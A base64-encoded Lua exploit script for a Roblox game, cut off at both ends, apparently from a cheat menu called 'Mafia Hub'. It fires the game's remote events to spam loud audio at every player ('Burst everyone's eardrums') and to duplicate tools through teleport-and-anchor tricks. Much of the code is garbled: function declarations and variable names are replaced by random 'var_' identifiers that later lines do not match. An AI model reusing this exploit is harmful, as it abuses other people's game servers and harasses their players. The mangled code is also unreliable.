dW5jdGlvbih2YWx1ZSkKICAgICAgICBzZWxlY3RlZEF1ZGlvSUQgPSB0b251bWJlcih2YWx1ZSkKICAgIGVuZAp9KQoKLS0gQWRkIGEgZHJvcGRvd24gdG8gc2VsZWN0IHRoZSBhdWRpbwpsb2NhbCB2YXJfNWQ3cWE2ID0ge30KZm9yIF8sIGF1ZGlvIGluIGlwYWlycyhhdWRpb3MpIGRvCiAgICB0YWJsZS5pbnNlcnQoYXVkaW9OYW1lcywgYXVkaW8uTmFtZSkKZW5kCgpUYWI6QWRkRHJvcGRvd24oewogICAgTmFtZSA9ICJTZWxlY3QgIiwKICAgIERlc2NyaXB0aW9uID0gIkNob29zZSBhbiBhdWRpbyBmcm9tIHRoZSBsaXN0LiIsCiAgICBPcHRpb25zID0gYXVkaW9OYW1lcywKICAgIERlZmF1bHQgPSBhdWRpb05hbWVzWzFdLAogICAgRmxhZyA9ICJzZWxlY3RlZF9hdWRpbyIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHZhbHVlKQogICAgICAgIGZvciBfLCBhdWRpbyBpbiBpcGFpcnMoYXVkaW9zKSBkbwogICAgICAgICAgICBpZiBhdWRpby5OYW1lID09IHZhbHVlIHRoZW4KICAgICAgICAgICAgICAgIHNlbGVjdGVkQXVkaW9JRCA9IGF1ZGlvLklECiAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAp9KQoKLS0gTG9vcCBjb250cm9sCmxvY2FsIHZhcl9vZnhpeXcgPSBmYWxzZQoKLS0gTmV3IHNlY3Rpb24gZm9yIGF1ZGlvIGxvb3AKVGFiOkFkZFNlY3Rpb24oeyJBdWRpbyBMb29wIn0pCgotLSBGdW5jdGlvbiB0byBwbGF5IGF1ZGlvIHJlcGVhdGVkbHkKbG9jYWwgdmFyXzFndG5kbSBwbGF5TG9vcGVkQXVkaW8oKQogICAgd2hpbGUgYXVkaW9Mb29wIGRvCiAgICAgICAgaWYgc2VsZWN0ZWRBdWRpb0lEIHRoZW4KICAgICAgICAgICAgbG9jYWwgdmFyXzdhenRucSA9IHsKICAgICAgICAgICAgICAgIFsxXSA9IGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIiksCiAgICAgICAgICAgICAgICBbMl0gPSBzZWxlY3RlZEF1ZGlvSUQsCiAgICAgICAgICAgICAgICBbM10gPSAxLAogICAgICAgICAgICB9CiAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5SRTpGaW5kRmlyc3RDaGlsZCgiMUd1MW5Tb3VuZDFzIik6RmlyZVNlcnZlcih1bnBhY2soYXJncykpCgogICAgICAgICAgICAtLSBDcmVhdGUgYW5kIHBsYXkgdGhlIGF1ZGlvCiAgICAgICAgICAgIGxvY2FsIHZhcl9qYzhnaXcgPSBJbnN0YW5jZS5uZXcoIlNvdW5kIikKICAgICAgICAgICAgc291bmQuU291bmRJZCA9ICJyYnhhc3NldGlkOi8vIiAuLiBzZWxlY3RlZEF1ZGlvSUQKICAgICAgICAgICAgc291bmQuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0CiAgICAgICAgICAgIHNvdW5kOlBsYXkoKQogICAgICAgIGVsc2UKICAgICAgICAgICAgd2FybigiTm8gYXVkaW8gc2VsZWN0ZWQhIikKICAgICAgICBlbmQKCiAgICAgICAgdGFzay53YWl0KDAuNSkgLS0gU21hbGwgZGVsYXkgdG8gYXZvaWQgb3ZlcmxvYWQKICAgIGVuZAplbmQKCi0tIFRvZ2dsZSBmb3IgYXVkaW8gbG9vcApUYWI6QWRkVG9nZ2xlKHsKICAgIE5hbWUgPSAiUGxheSBhdWRpbyBpbiBsb29wIiwKICAgIERlc2NyaXB0aW9uID0gIkFjdGl2YXRlcyB0aGUgYXVkaW8gbG9vcCIsCiAgICBEZWZhdWx0ID0gZmFsc2UsCiAgICBGbGFnID0gImF1ZGlvX2xvb3AiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih2YWx1ZSkKICAgICAgICBhdWRpb0xvb3AgPSB2YWx1ZQogICAgICAgIGlmIGF1ZGlvTG9vcCB0aGVuCiAgICAgICAgICAgIHRhc2suc3Bhd24ocGxheUxvb3BlZEF1ZGlvKSAtLSBTdGFydCB0aGUgbG9vcCBpbiBhIG5ldyB0aHJlYWQKICAgICAgICBlbmQKICAgIGVuZAp9KQoKLS0gQWRkIGEgcGFyYWdyYXBoIGFzIGEgbGFiZWwKVGFiOkFkZFBhcmFncmFwaCh7IkluZm8iLCAiQXVkaW8gb24gbG9vcCAoYWxsIHBsYXllcnMgb24gdGhlIHNlcnZlciBjYW4gaGVhciBpdCkifSkKCi0tIEZ1bmN0aW9uIHRvIHBsYXkgbm9ybWFsIGF1ZGlvCmxvY2FsIHZhcl82Zmhhb2IgcGxheUF1ZGlvKCkKICAgIGlmIHNlbGVjdGVkQXVkaW9JRCB0aGVuCiAgICAgICAgbG9jYWwgdmFyX25wbml1ZSA9IHsKICAgICAgICAgICAgWzFdID0gZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKSwKICAgICAgICAgICAgWzJdID0gc2VsZWN0ZWRBdWRpb0lELAogICAgICAgICAgICBbM10gPSAxLAogICAgICAgIH0KICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuUkU6RmluZEZpcnN0Q2hpbGQoIjFHdTFuU291bmQxcyIpOkZpcmVTZXJ2ZXIodW5wYWNrKGFyZ3MpKQoKICAgICAgICAtLSBDcmVhdGUgYW5kIHBsYXkgdGhlIGF1ZGlvCiAgICAgICAgbG9jYWwgdmFyX2sxMnppZCA9IEluc3RhbmNlLm5ldygiU291bmQiKQogICAgICAgIHNvdW5kLlNvdW5kSWQgPSAicmJ4YXNzZXRpZDovLyIgLi4gc2VsZWN0ZWRBdWRpb0lECiAgICAgICAgc291bmQuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0CiAgICAgICAgc291bmQ6UGxheSgpCiAgICBlbHNlCiAgICAgICAgd2FybigiTm8gYXVkaW8gc2VsZWN0ZWQhIikKICAgIGVuZAplbmQKCi0tIE5ldyBzZWN0aW9uIGZvciBwbGF5aW5nIGF1ZGlvClRhYjpBZGRTZWN0aW9uKHsiUGxheSBhdWRpbyJ9KQoKLS0gQnV0dG9uIHRvIHBsYXkgdGhlIGF1ZGlvClRhYjpBZGRCdXR0b24oeyJQbGF5IGF1ZGlvIiwgZnVuY3Rpb24oKQogICAgcGxheUF1ZGlvKCkKZW5kfSkKCmxvY2FsIHZhcl8yZTE3YWogPSBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikKbG9jYWwgdmFyX2xwcTZibSA9IDYzMTQ4ODAxNzQgLS0gRml4ZWQgYXVkaW8gSUQKCmxvY2FsIHZhcl8yZmw4OWggQXVkaW9fQWxsX0NsaWVudFNpZGUoSUQpCiAgICBsb2NhbCB2YXJfeDBxNjgxIENoZWNrRm9sZGVyQXVkaW9BbGwoKQogICAgICAgIGxvY2FsIHZhcl9mc2NkaDggPSB3b3Jrc3BhY2U6RmluZEZpcnN0Q2hpbGQoIkF1ZGlvIGFsbCBjbGllbnQiKQogICAgICAgIGlmIG5vdCBGb2xkZXJBdWRpbyB0aGVuCiAgICAgICAgICAgIEZvbGRlckF1ZGlvID0gSW5zdGFuY2UubmV3KCJGb2xkZXIiKQogICAgICAgICAgICBGb2xkZXJBdWRpby5OYW1lID0gIkF1ZGlvIGFsbCBjbGllbnQiCiAgICAgICAgICAgIEZvbGRlckF1ZGlvLlBhcmVudCA9IHdvcmtzcGFjZQogICAgICAgIGVuZAogICAgICAgIHJldHVybiBGb2xkZXJBdWRpbwogICAgZW5kCgogICAgbG9jYWwgdmFyX3lzdnY3MCBDcmVhdGVTb3VuZChJRCkKICAgICAgICBpZiB0eXBlKElEKSB+PSAibnVtYmVyIiB0aGVuCiAgICAgICAgICAgIHByaW50KCJJbnNlcnQgYSB2YWxpZCBudW1iZXIhIikKICAgICAgICAgICAgcmV0dXJuIG5pbAogICAgICAgIGVuZAoKICAgICAgICBsb2NhbCB2YXJfcTdlb3BvID0gQ2hlY2tGb2xkZXJBdWRpb0FsbCgpCiAgICAgICAgaWYgRm9sZGVyX0F1ZGlvIHRoZW4KICAgICAgICAgICAgbG9jYWwgdmFyX2doNDdpMiA9IEluc3RhbmNlLm5ldygiU291bmQiKQogICAgICAgICAgICBTb3VuZC5Tb3VuZElkID0gInJieGFzc2V0aWQ6Ly8iIC4uIElECiAgICAgICAgICAgIFNvdW5kLlZvbHVtZSA9IDEKICAgICAgICAgICAgU291bmQuTG9vcGVkID0gZmFsc2UKICAgICAgICAgICAgU291bmQuUGFyZW50ID0gRm9sZGVyX0F1ZGlvCiAgICAgICAgICAgIFNvdW5kOlBsYXkoKQogICAgICAgICAgICB0YXNrLndhaXQoMSkgLS0gV2FpdCB0aW1lIGJlZm9yZSByZW1vdmluZyB0aGUgc291bmQKICAgICAgICAgICAgU291bmQ6RGVzdHJveSgpCiAgICAgICAgZW5kCiAgICBlbmQKCiAgICBDcmVhdGVTb3VuZChJRCkKZW5kCgpsb2NhbCB2YXJfc2k4eXBmIEF1ZGlvX0FsbF9TZXJ2ZXJTaWRlKElEKQogICAgaWYgdHlwZShJRCkgfj0gIm51bWJlciIgdGhlbgogICAgICAgIHByaW50KCJJbnNlcnQgYSB2YWxpZCBudW1iZXIhIikKICAgICAgICByZXR1cm4gbmlsCiAgICBlbmQKCiAgICBsb2NhbCB2YXJfZnp6OWY1ID0gUmVwbGljYXRlZFN0b3JhZ2U6RmluZEZpcnN0Q2hpbGQoIjFHdTFuU291bmQxcyIsIHRydWUpCiAgICBpZiBHdW5Tb3VuZEV2ZW50IHRoZW4KICAgICAgICBHdW5Tb3VuZEV2ZW50OkZpcmVTZXJ2ZXIod29ya3NwYWNlLCBJRCwgMSkKICAgIGVuZAplbmQKCi0tIFRvZ2dsZSBmb3IgIkJ1cnN0IGV2ZXJ5b25lJ3MgZWFyZHJ1bXMiClRhYjpBZGRUb2dnbGUoewogICAgTmFtZSA9ICIgQnVyc3QgZXZlcnlvbmUncyBlYXJkcnVtcyIsCiAgICBEZXNjcmlwdGlvbiA9ICJSZXByb2R1eiBvIOF1ZGlvIHJlcGV0aWRhbWVudGUgcGFyYSB0b2Rvcy4iLAogICAgRGVmYXVsdCA9IGZhbHNlLAogICAgRmxhZyA9ICJhdWRpb19zcGFtIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24odmFsdWUpCiAgICAgICAgZ2V0Z2VudigpLkF1ZGlvX0FsbF9sb29wX2Zhc3QgPSB2YWx1ZQoKICAgICAgICB3aGlsZSBnZXRnZW52KCkuQXVkaW9fQWxsX2xvb3BfZmFzdCBkbwogICAgICAgICAgICBBdWRpb19BbGxfU2VydmVyU2lkZShhdWRpb0lEKQogICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIEF1ZGlvX0FsbF9DbGllbnRTaWRlKGF1ZGlvSUQpCiAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgdGFzay53YWl0KDAuMDEpCiAgICAgICAgZW5kCiAgICBlbmQKfSkKClRhYjpBZGRQYXJhZ3JhcGgoeyJJbmZvIiwgIkV2ZXJ5b25lIG9uIHRoZSBzZXJ2ZXIgY2FuIGhlYXIgdGhlIGF1ZGlvLiJ9KQoKbG9jYWwgdmFyXzIycnBtayA9IFdpbmRvdzpNYWtlVGFiKHsiSXRlbXMgW05FV10iLCAiYmFja3BhY2sifSkKCi0tIENvbG9yIHRhYmxlCmxvY2FsIHZhcl9oNnlvYzggPSB7CiAgICB7TmFtZSA9ICJSZWQiLCBDb2xvciA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMCwgMCl9LAogICAge05hbWUgPSAiT3JhbmdlIiwgQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDE2NSwgMCl9LAogICAge05hbWUgPSAiWWVsbG93IiwgQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMCl9LAogICAge05hbWUgPSAiR3JlZW4iLCBDb2xvciA9IENvbG9yMy5mcm9tUkdCKDAsIDI1NSwgMCl9LAogICAge05hbWUgPSAiQ3lhbiIsIENvbG9yID0gQ29sb3IzLmZyb21SR0IoMCwgMjU1LCAyNTUpfSwKICAgIHtOYW1lID0gIkJsdWUiLCBDb2xvciA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDI1NSl9LAogICAge05hbWUgPSAiUHVycGxlIiwgQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigxMjgsIDAsIDEyOCl9LAogICAge05hbWUgPSAiQmxhY2siLCBDb2xvciA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApfQp9CgotLSBCdXR0b24gdG8gY29sb3IgdGhlIG1hcApUb29sc1RhYjpBZGRCdXR0b24oewogICAgTmFtZSA9ICJDb2xvciBNYXAgRmxvb3IgW05FV10iLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgIGxvY2FsIHZhcl85dmtoNzAgPSAiUGFpbnRSb2xsZXIiCmxvY2FsIHZhcl81bjNiMTAgPSAxMDAKbG9jYWwgdmFyXzV4dTQxaiA9IGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5SRTpGaW5kRmlyc3RDaGlsZCgiMVRvbzFsIikKbG9jYWwgdmFyX29xdXZsZyA9IGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5SRTpGaW5kRmlyc3RDaGlsZCgiMUNsZWExclRvb2wxcyIpCmxvY2FsIHZhcl8yejdhdHQgPSB0cnVlCmxvY2FsIHZhcl84cjM5MGggPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lCgoKbG9jYWwgdmFyX2s1c3NydyA9IHt9CmZvciBpID0gMSwgMTAwIGRvCiAgICBpZiBpID09IDEgdGhlbgogICAgICAgIHRhYmxlLmluc2VydChHcmlwUG9zVGFibGUsIFZlY3RvcjMubmV3KDAsIDUsIDApKSAKICAgIGVsc2UKICAgICAgICB0YWJsZS5pbnNlcnQoR3JpcFBvc1RhYmxlLCBWZWN0b3IzLm5ldygoaSAtIDEpICogMS4yLCA1LCAwKSkgCiAgICBlbmQKZW5kCgpsb2NhbCB2YXJfeHhyczduID0gMApmb3IgXywgdG9vbCBpbiBwYWlycyhnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2s6R2V0Q2hpbGRyZW4oKSkgZG8KICAgIGlmIHRvb2w6SXNBKCJUb29sIikgYW5kIHRvb2wuTmFtZSA9PSB0b29sc2VsZWN0ZWQgdGhlbgogICAgICAgIHRvb2xDb3VudCA9IHRvb2xDb3VudCArIDEKICAgIGVuZAplbmQKZm9yIF8sIHRvb2wgaW4gcGFpcnMoZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpHZXRDaGlsZHJlbigpKSBkbwogICAgaWYgdG9vbDpJc0EoIlRvb2wiKSBhbmQgdG9vbC5OYW1lID09IHRvb2xzZWxlY3RlZCB0aGVuCiAgICAgICAgdG9vbENvdW50ID0gdG9vbENvdW50ICsgMQogICAgZW5kCmVuZAoKaWYgdG9vbENvdW50ID49IGR1cGVhbW90IHRoZW4KICAgIC0tIFVuZXF1aXBzIGFuZCBtb3ZlcyB0aGUgdG9vbHMgdG8gdGhlIGRlZmluZWQgcG9zaXRpb25zCiAgICBmb3IgaSwgdG9vbCBpbiBwYWlycyhnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgaWYgdG9vbDpJc0EoIlRvb2wiKSBhbmQgdG9vbC5OYW1lID09IHRvb2xzZWxlY3RlZCB0aGVuCiAgICAgICAgICAgIHRvb2wuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrCiAgICAgICAgZW5kCiAgICBlbmQKICAgIGZvciBpLCB0b29sIGluIHBhaXJzKGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjazpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgIGlmIHRvb2w6SXNBKCJUb29sIikgYW5kIHRvb2wuTmFtZSA9PSB0b29sc2VsZWN0ZWQgdGhlbgogICAgICAgICAgICB0b29sLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgbG9jYWwgdmFyX2RyYmQ1bCA9IG1hdGgubWluKGksICNHcmlwUG9zVGFibGUpCiAgICAgICAgICAgIGxvY2FsIHZhcl92M3E2M3ogPSBHcmlwUG9zVGFibGVbZ3JpcFBvc0luZGV4XQogICAgICAgICAgICB0b29sLkdyaXBQb3MgPSBncmlwUG9zCiAgICAgICAgZW5kCiAgICBlbmQKZWxzZQogICAgCiAgICBsb2NhbCB2YXJfdXhiN3RyID0gewogICAgICAgIFsxXSA9ICJDbGVhckFsbFRvb2xzIgogICAgfQogICAgCiAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIik6V2FpdEZvckNoaWxkKCJSRSIpOldhaXRGb3JDaGlsZCgiMUNsZWExclRvb2wxcyIpOkZpcmVTZXJ2ZXIodW5wYWNrKGFyZ3MpKQogICAgCiAgICB3YWl0KDAuMikKICAgIAogICAgZ2FtZTpHZXRTZXJ2aWNlKCJTdGFydGVyR3VpIik6U2V0Q29yZSgiU2VuZE5vdGlmaWNhdGlvbiIsIHsKICAgICAgICBUaXRsZSA9ICJNYWZpYSBIdWIgRHVwZSIsCiAgICAgICAgVGV4dCA9ICJEb24ndCBjbGljayBvbiBhbnl0aGluZyB3aGlsZSB0aGUgdG9vbHMgYXJlIGJlaW5nIGR1cGVkIiwKICAgICAgICBCdXR0b24xID0gIkdvdCBpdCIsCiAgICAgICAgRHVyYXRpb24gPSAzCiAgICB9KQogICAgCiAgICBpZiBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkLlNpdCA9PSB0cnVlIHRoZW4KICAgICAgICB0YXNrLndhaXQoKQogICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQuU2l0ID0gZmFsc2UKICAgIGVuZAogICAgCiAgICB3YWl0KDAuMSkKICAgIAogICAgaWYgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIikgdGhlbgogICAgICAgIGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIik6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYSIpOkRlc3Ryb3koKQogICAgZW5kCiAgICAKICAgIGZvciBtID0gMSwgMiBkbwogICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoOTk5OTk5OTk5LjQxNCwgLTQ5MCwgOTk5OTk5OTk5LjQxNCwgMC45NzQzNjA0MDYsIC0wLjE3NTczNDA4OCwgMC4xNDA0OTc2MSwgLTAuMTMzNDQxNDA0LCAwLjA1MTQwNTMwNjksIDAuOTg5NzIyNzI5LCAtMC4xODExNTAzMDIsIC0wLjk4MzA5NDY5MiwgMC4wMjY2MzcwOTIyKQogICAgZW5kCiAgICAKICAgIHRhc2sud2FpdCgwLjIpCiAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSB0cnVlCiAgICB3YWl0KDAuNSkKICAgIAogICAgZm9yIGFpZGosIGFmaCBpbiBwYWlycyhnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICBpZiBub3QgYWZoLk5hbWUgPT0gdG9vbHNlbGVjdGVkIHRoZW4KICAgICAgICAgICAgaWYgYWZoOklzQSgiVG9vbCIpIHRoZW4KICAgICAgICAgICAgICAgIGFmaC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKICAgIAogICAgZm9yIGFpZWZoaWV3aHdmLCBkdmpidmogaW4gcGFpcnMoZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQmFja3BhY2s6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICBpZiBkdmpidmo6SXNBKCJUb29sIikgdGhlbgogICAgICAgICAgICBpZiBub3QgZHZqYnZqLk5hbWUgPT0gdG9vbHNlbGVjdGVkIHRoZW4KICAgICAgICAgICAgICAgIGR2amJ2ajpEZXN0cm95KCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKICAgIAogICAgZm9yIHR0anRqdXRqdXRqanRqLCBkZHZkdmRzdmRmYnJueXR5dG12ZHYgaW4gcGFpcnMoZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgaWYgZGR2ZHZkc3ZkZmJybnl0eXRtdmR2OklzQSgiVG9vbCIpIHRoZW4KICAgICAgICAgICAgaWYgbm90IGRkdmR2ZHN2ZGZicm55dHl0bXZkdi5uYW1lID09IHRvb2xzZWxlY3RlZCB0aGVuCiAgICAgICAgICAgICAgICBkZHZkdmRzdmRmYnJueXR5dG12ZHY6RGVzdHJveSgpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCiAgICAKICAgIGZvciBmaW5kaW4sIHRvb2xsZWwgaW4gcGFpcnMoZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgaWYgdG9vbGxlbDpJc0EoIlRvb2wiKSB0aGVuCiAgICAgICAgICAgIGlmIHRvb2xsZWwuTmFtZSA9PSB0b29sc2VsZWN0ZWQgdGhlbgogICAgICAgICAgICAgICAgdG9vbGxsbGZvdW4yID0gdHJ1ZQogICAgICAgICAgICAgICAgZm9yIGJhc2MsIGFpamZ3IGluIHBhaXJzKHRvb2xsZWw6R2V0RGVzY2VuZGFudHMoKSkgZG8KICAgICAgICAgICAgICAgICAgICBpZiBhaWpmdy5OYW1lID09ICJIYW5kbGUiIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgYWlqZncuTmFtZSA9ICJI4qVh4qVu4qVk4qVs4qVlIgogICAgICAgICAgICAgICAgICAgICAgICB0b29sbGVsLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjawogICAgICAgICAgICAgICAgICAgICAgICB0b29sbGVsLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgdG9sbGxhaGhoaCA9IHRvb2xsZWwKICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB0b29sbGxsZm91bjIgPSBmYWxzZQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAogICAgCiAgICBmb3IgZmlpZmksIHRvb2xsbGwgaW4gcGFpcnMoZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQmFja3BhY2s6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICBpZiB0b29sbGxsOklzQSgiVG9vbCIpIHRoZW4KICAgICAgICAgICAgaWYgdG9vbGxsbC5OYW1lID09IHRvb2xzZWxlY3RlZCB0aGVuCiAgICAgICAgICAgICAgICB0b29sbGxsZm91biA9IHRydWUKICAgICAgICAgICAgICAgIGZvciBuYW5hLCBqanNqc2ogaW4gcGFpcnModG9vbGxsbDpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICAgICAgICAgIGlmIGpqc2pzai5OYW1lID09ICJIYW5kbGUiIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgdG9vbGxsbC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgICAgIHdhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICBqanNqc2ouTmFtZSA9ICJI4qVh4qVu4qVk4qVs4qVlIgogICAgICAgICAgICAgICAgICAgICAgICB0b29sbGxsLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjawogICAgICAgICAgICAgICAgICAgICAgICB0b29sbGxsLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgdG9vbGxsZmZlbCA9IHRvb2xsbGwKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB0b29sbGxsZm91biA9IGZhbHNlCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCiAgICAKICAgIGlmIHRvb2xsbGxmb3VuID09IHRydWUgdGhlbgogICAgICAgIGlmIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQodG9vbGxsZmZlbCkgPT0gbmlsIHRoZW4KICAgICAgICAgICAgdG9vbGxsbGZvdW4gPSBmYWxzZQogICAgICAgIGVuZAogICAgICAgIHJlcGVhdAogICAgICAgICAgICB3YWl0KCkKICAgICAgICB1bnRpbCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKHRvb2xsbGZmZWwpID09IG5pbAogICAgICAgIHRvb2xsbGxmb3VuID0gZmFsc2UKICAgIGVuZAogICAgCiAgICBpZiB0b29sbGxsZm91bjIgPT0gdHJ1ZSB0aGVuCiAgICAgICAgaWYgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCh0b2xsbGxhaGhoaCkgPT0gbmlsIHRoZW4KICAgICAgICAgICAgdG9vbGxsbGZvdW4yID0gZmFsc2UKICAgICAgICBlbmQKICAgICAgICByZXBlYXQKICAgICAgICAgICAgd2FpdCgpCiAgICAgICAgdW50aWwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCh0b2xsbGxhaGhoaCkgPT0gbmlsCiAgICAgICAgdG9vbGxsbGZvdW4yID0gZmFsc2UKICAgIGVuZAogICAgCiAgICB3YWl0KDAuMSkKICAgIAogICAgZm9yIG0gPSAxLCBkdXBlYW1vdCBkbwogICAgICAgIGlmIGR1cGluZyA9PSBmYWxzZSB0aGVuCiAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IGZhbHNlCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGVuZAogICAgICAgIGlmIGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIik6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYSIpIHRoZW4KICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIik6RGVzdHJveSgpCiAgICAgICAgZW5kCiAgICAgICAgaWYgbSA8PSBkdXBlYW1vdCB0aGVuCiAgICAgICAgZWxzZWlmIG0gPT0gZHVwZWFtb3Qgb3IgbSA+PSBkdXBlYW1vdCAtIDEgdGhlbgogICAgICAgIGVuZAogICAgICAgIGxvY2FsIHZhcl9mZDZhencgPSB7CiAgICAgICAgICAgIFsxXSA9ICJQaWNraW5nVG9vbHMiLAogICAgICAgICAgICBbMl0gPSB0b29sc2VsZWN0ZWQKICAgICAgICB9CiAgICAgICAgcGlja3Rvb2xyZW1vdGU6SW52b2tlU2VydmVyKHVucGFjayhhcmdzKSkKICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5CYWNrcGFjazpXYWl0Rm9yQ2hpbGQodG9vbHNlbGVjdGVkKS5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgaWYgZHVwaW5nID09IGZhbHNlIHRoZW4KICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2F